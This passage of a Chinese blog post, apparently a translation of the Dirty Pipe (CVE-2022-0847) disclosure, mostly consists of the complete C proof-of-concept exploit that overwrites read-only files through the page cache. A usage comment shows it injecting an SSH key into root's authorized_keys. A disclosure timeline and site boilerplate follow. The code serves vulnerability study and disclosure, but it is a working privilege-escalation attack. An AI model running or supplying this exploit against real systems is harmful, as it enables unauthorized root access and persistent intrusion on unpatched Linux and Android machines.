class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="hljs-comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="hljs-comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="hljs-comment"> * file contents in the page cache, even if the file is not permitted</span><br><span class="hljs-comment"> * to be written, immutable or on a read-only mount.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="hljs-comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="hljs-comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="hljs-comment"> * there before, it just provided an easy way to exploit it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="hljs-comment"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="hljs-comment"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="hljs-comment"> * cross a page boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepare_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">pipe</span>(p)) <span class="hljs-built_in">abort</span>();<br><br>	<span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> pipe_size = <span class="hljs-built_in">fcntl</span>(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>	<span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">4096</span>];<br><br>	<span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>		<span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br>		<span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], buffer, n);<br>		r -= n;<br>	&#125;<br><br>	<span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">	   leaving the flags initialized) */</span><br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>		<span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br>		<span class="hljs-built_in">read</span>(p[<span class="hljs-number">0</span>], buffer, n);<br>		r -= n;<br>	&#125;<br><br>	<span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">	   will be mergeable */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br>		<span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-comment">/* dumb command-line argument parser */</span><br>	<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> path = argv[<span class="hljs-number">1</span>];<br>	<span class="hljs-keyword">loff_t</span> offset = <span class="hljs-built_in">strtoul</span>(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> data = argv[<span class="hljs-number">3</span>];<br>	<span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br>	<span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> end_offset = offset + (<span class="hljs-keyword">loff_t</span>)data_size;<br>	<span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br>		<span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-comment">/* open the input file and validate the specified offset */</span><br>	<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br>	<span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;open failed&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">fstat</span>(fd, &amp;st)) &#123;<br>		<span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;stat failed&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br>		<span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br>		<span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">	   PIPE_BUF_FLAG_CAN_MERGE */</span><br>	<span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>];<br>	<span class="hljs-built_in">prepare_pipe</span>(p);<br><br>	<span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">	   pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">	   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>	--offset;<br>	<span class="hljs-keyword">ssize_t</span> nbytes = <span class="hljs-built_in">splice</span>(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;splice failed&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">	   will instead write into the page cache, because of the</span><br><span class="hljs-comment">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>	nbytes = <span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], data, data_size);<br>	<span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;write failed&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((<span class="hljs-keyword">size_t</span>)nbytes &lt; data_size) &#123;<br>		<span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;short write\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> EXIT_FAILURE;<br>	&#125;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br>	<span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><ul>
<li>2021-04-29: 收到第一封关于文件损坏的工单</li>
<li>2022-02-19: 文件损坏问题被确定为Linux内核错误，这是一个可利用的漏洞</li>
<li>2022-02-20: 向Linux内核安全团队发送<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html">错误报告、漏洞攻击和补丁</a></li>
<li>2022-02-21: 谷歌Pixel 6上重现的漏洞；发送给安卓安全团队的错误报告</li>
<li>2022-02-21: 按照Linus Torvalds、Willy Tarreau和Al Viro的建议，将补丁发送给<a target="_blank" rel="noopener" href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">LKML（无漏洞详细信息）</a></li>
<li>2022-02-23: Linux稳定版修复了我的漏洞（<a target="_blank" rel="noopener" href="https://lore.kernel.org/stable/1645618039140207@kroah.com/">5.16.11</a>、<a target="_blank" rel="noopener" href="https://lore.kernel.org/stable/164561803311588@kroah.com/">5.15.25</a>、<a target="_blank" rel="noopener" href="https://lore.kernel.org/stable/164561802556115@kroah.com/">5.10.102</a>）</li>
<li>2022-02-24: 谷歌将我的漏洞修复程序合并到<a target="_blank" rel="noopener" href="https://android-review.googlesource.com/c/kernel/common/+/1998671">Android内核</a>中</li>
<li>2022-02-28: 通知<a target="_blank" rel="noopener" href="https://oss-security.openwall.org/wiki/mailing-lists/distros#how-to-use-the-lists">linux发行版邮件</a></li>
<li>2022-03-07: 公开披露列表</li>
</ul>

                            </div>
                            
                                <p class="note note-info">
                                    
                                                    本文最后更新于：
                                                        2022年3月15日 晚上
                                                            
                                </p>
                                
                                    <hr>
                                    <div>
                                        <div class="post-metas mb-3">
                                            
                                                <div class="post-meta mr-3">
                                                    <i class="iconfont icon-category"></i>
                                                    
                                                        <a class="hover-with-bg" href="/categories/%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91/">
                                                            文档翻译
                                                        </a>
                                                        
                                                </div>
                                                
                                                    
                                                        <div class="post-meta">
                                                            <i class="iconfont icon-tags"></i>
                                                            
                                                                <a class="hover-with-bg" href="/tags/%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91/">
                                                                    文档翻译
                                                                </a>
                                                                
                                                                <a class="hover-with-bg" href="/tags/CVE-2022-0847/">
                                                                    CVE-2022-0847
                                                                </a>
                                                                
                                                                <a class="hover-with-bg" href="/tags/Dirty-Pipe%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
                                                                    Dirty Pipe提权漏洞
                                                                </a>
                                                                
                                                        </div>
                                                        
                                        </div>
                                        
                                            <p class="note note-warning">
                                                
                                                            本博客所有文章欢迎转载 ，但希望转载时能注明出处！ </br>关于文章，如有疑问，欢迎讨论！Email:corp0ra1@qq.com </br>如果图片无法显示:https://corp0ra1.github.io/common/imageLoad.html
                                                                
                                            </p>
                                            
                                                
                                                    <div class="post-prevnext">
                                                        <article class="post-prev col-6">
                                                            
                                                                
                                                                    <a href="/2022/04/10/The%20Dirty%20Pipe%20Vulnerability_%E5%A4%8D%E7%8E%B0/">
                                                                        <i class="iconfont icon-arrowleft"></i>
                                                                        <span class="hidden-mobile">The Dirty Pipe Vulnerability[学习记录]</span>
                                                                        <span class="visible-mobile">上一篇</span>
                                                                    </a>
                                                                    
                                                        </article>
                                                        <article class="post-next col-6">
                                                            
                                                                
                                                                    <a href="/2021/08/06/%5Bnotion%5DTELEPORT%E5%A0%A1%E5%9E%92%E6%9C%BASQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
                                                                        <span class="hidden-mobile">TELEPORT堡垒机SQL注入漏洞</span>
                                                                        <span class="visible-mobile">下一篇</span>
                                                                        <i class="iconfont icon-arrowright"></i>
                                                                    </a>
                                                                    
                                                        </article>
                                                    </div>
                                                    
                                    </div>

                                    
                        </article>
                    </div>
                </div>
            </div>
            
                <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
                    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

                </div>
                
        </div>
    </div>

    <!-- Custom -->
    
    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <div> <div class="copyright">©2020 - 2021 By Corp0ra1</div> </div> <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> &nbsp;|&nbsp; <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> &nbsp;|&nbsp; <a href="https://github.com/jsdelivr/jsdelivr" target="_blank" rel="nofollow noopener"><span>jsDelivr</span></a> </div> 
  </div>
  <!--添加运行时间-->
<div id="sitetime"></div>
<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* 
      Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
      year - 作为date对象的年份，为4位年份值
      month - 0-11之间的整数，做为date对象的月份
      day - 1-31之间的整数，做为date对象的天数
      hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
      minutes - 0-59之间的整数，做为date对象的分钟数
      seconds - 0-59之间的整数，做为date对象的秒数
      microseconds - 0-999之间的整数，做为date对象的毫秒数
     */
        var t1 = Date.UTC(2021, 05, 01, 00, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "很高兴遇到你，我已经在此等候了你 " + /*diffYears+" 年 "+*/ diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }
    siteTime();
</script>

    <div class="statistics">
        
            

                
                                                
                                                    <!-- 不蒜子统计PV -->
                                                    <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            
            <span id="busuanzi_value_site_pv"></span>
                                                     次
                                                        &nbsp; <span class="iconfont icon-love"></span></span>
                                                        

                                                            

                                                                <!-- 不蒜子统计UV -->
                                                                <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            
            <span id="busuanzi_value_site_uv"></span>
                                                                 人
                                                                    </span>
                                                                    
                                                                        
    </div>
    
  
  <!-- 备案信息 -->
  <div class="beian">
    <span>
      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
        鄂ICP备2022018419号-1
      </a>
    </span>
    
      
        <span>
          <a
            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=46010802001190"
            rel="nofollow noopener"
            class="beian-police"
            target="_blank"
          >
            
              <span style="visibility: hidden; width: 0">|</span>
              <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
            
            <span>琼公网安备 46010802001190号</span>
          </a>
        </span>
      
    
  </div>


  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      $('#local-search-input').on('click', function() {
        searchFunc(path, 'local-search-input', 'local-search-result');
      });
      $('#modalSearch').on('shown.bs.modal', function() {
        $('#local-search-input').focus();
      });
    })()
  </script>












    
        <!-- Baidu Analytics -->
        <script defer>
            var _hmt = _hmt || [];
            (function() {
                var hm = document.createElement("script");
                hm.src = "https://hm.baidu.com/hm.js?a1a4ccab78dfa522556928ac810fa739";
                var s = document.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(hm, s);
            })();
        </script>
        

            
                <!-- Google Analytics -->
                <!-- <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-4X9XV0H0D5', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script> -->
                <!-- Global site tag (gtag.js) - Google Analytics -->
                <script async src="https://www.googletagmanager.com/gtag/js?G-4X9XV0H0D5"></script>
                <script>
                    window.dataLayer = window.dataLayer || [];

                    function gtag() {
                        dataLayer.push(arguments);
                    }
                    gtag('js', new Date());

                    gtag('config', 'G-4X9XV0H0D5');
                </script>
                

                    

                            

                                    

                                            
                                                    



<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
